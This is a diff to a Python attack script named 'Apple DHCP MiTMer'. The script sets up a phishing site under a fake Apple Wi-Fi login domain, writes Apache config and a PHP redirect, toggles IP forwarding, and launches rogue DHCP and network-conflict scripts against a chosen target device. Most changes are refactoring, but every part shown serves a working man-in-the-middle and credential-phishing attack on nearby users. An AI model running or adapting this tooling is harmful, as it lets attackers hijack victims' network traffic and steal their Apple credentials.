@@ -1,5 +1,12 @@
 #!/usr/bin/env python
 
+# region Import
+from sys import path
+from os.path import dirname, abspath
+project_root_path = dirname(dirname(dirname(abspath(__file__))))
+utils_path = project_root_path + "/Utils/"
+path.append(utils_path)
+
 from base import Base
 from os import path, errno, makedirs
 from shutil import copyfile, copytree
@@ -9,25 +16,27 @@ from sys import exit
 from time import sleep, time
 from ipaddress import IPv4Address
 import re
+# endregion
 
+# region Check user, platform and print banner
 Base = Base()
 Base.check_user()
 Base.check_platform()
+Base.print_banner()
+# endregion
 
+# region Parse script arguments
 parser = ArgumentParser(description='Apple DHCP MiTMer script')
-
 parser.add_argument('-i', '--listen_iface', type=str, help='Set interface name for send DHCPACK packets')
-
 parser.add_argument('-f', '--fishing_domain', type=str, default="auth.apple.wi-fi.com",
                     help='Set domain name for social engineering (default="auth.apple.wi-fi.com")')
 parser.add_argument('-p', '--fishing_domain_path', type=str, default="apple",
                     help='Set local path to domain name for social engineering (default="apple")')
-
 parser.add_argument('-k', '--kill', action='store_true', help='Kill process')
 parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
 parser.add_argument('-n', '--new_ip', type=str, help='Set new IP address for target', default=None)
-
 args = parser.parse_args()
+# endregion
 
 # region Kill subprocess
 sub.Popen(["kill -9 $(ps aux | grep apple_rogue_dhcp.py | grep -v grep | awk '{print $2}') 2>/dev/null"],
@@ -38,8 +47,6 @@ sub.Popen(["kill -9 $(ps aux | grep dnschef | grep -v grep | awk '{print $2}') 2
 if args.kill:
     exit(0)
 # endregion
-
-Base.print_banner()
 
 # region Set global variables
 apple_devices = []
@@ -112,7 +119,7 @@ if __name__ == "__main__":
         ipv4_forward_file.write("0")
 
     # Variables
-    script_dir = path.dirname(path.realpath(__file__))
+    script_dir = project_root_path
     apache2_sites_available_dir = "/etc/apache2/sites-available/"
     apache2_sites_enabled_dir = "/etc/apache2/sites-enabled/"
     apache2_sites_path = "/var/www/html/"
@@ -168,12 +175,17 @@ if __name__ == "__main__":
     default_site_file.close()
 
     # Create dir with redirect script
-    if not path.isdir(redirect_path):
+    try:
         makedirs(redirect_path)
+    except OSError:
+        Base.print_info("Path: ", redirect_path, " already exist.")
+    except:
+        Base.print_error("Something else went wrong while trying to create path: ", redirect_path)
+        exit(1)
 
     # Copy and change redirect script
     redirect_script_name = "redirect.php"
-    redirect_script_src = script_dir + "/Tools/" + redirect_script_name
+    redirect_script_src = script_dir + "/Utils/" + redirect_script_name
     redirect_script_dst = redirect_path + redirect_script_name
 
     copyfile(src=redirect_script_src, dst=redirect_script_dst)
@@ -281,9 +293,10 @@ if __name__ == "__main__":
             apple_device = [target_ip, target_mac]
     # endregion
 
-    # Output target IP and MAC address
     if len(apple_device) > 0:
+        # region Output target IP and MAC address
         Base.print_info("Target: ", apple_device[0] + " (" + apple_device[1] + ")")
+        # endregion
 
         # region Set new IP address for target
         if args.new_ip is None:
@@ -324,11 +337,11 @@ if __name__ == "__main__":
 
         # region Run apple_rogue_dhcp and network_conflict_creator scripts
         try:
-            sub.Popen(['python ' + script_dir + '/apple_rogue_dhcp.py -i ' + listen_network_interface +
+            sub.Popen(['python ' + script_dir + '/Scripts/Apple/apple_rogue_dhcp.py -i ' + listen_network_interface +
                        ' -t ' + apple_device[1] + ' -I ' + new_ip + ' -q &'],
                       shell=True)
             sleep(3)
-            sub.Popen(['python ' + script_dir + '/network_conflict_creator.py -i ' +
+            sub.Popen(['python ' + script_dir + '/Scripts/Others/network_conflict_creator.py -i ' +
                        listen_network_interface + ' -I ' + apple_device[0] + ' -t ' + apple_device[1] +
                        ' -q'], shell=True)
         except OSError as e:
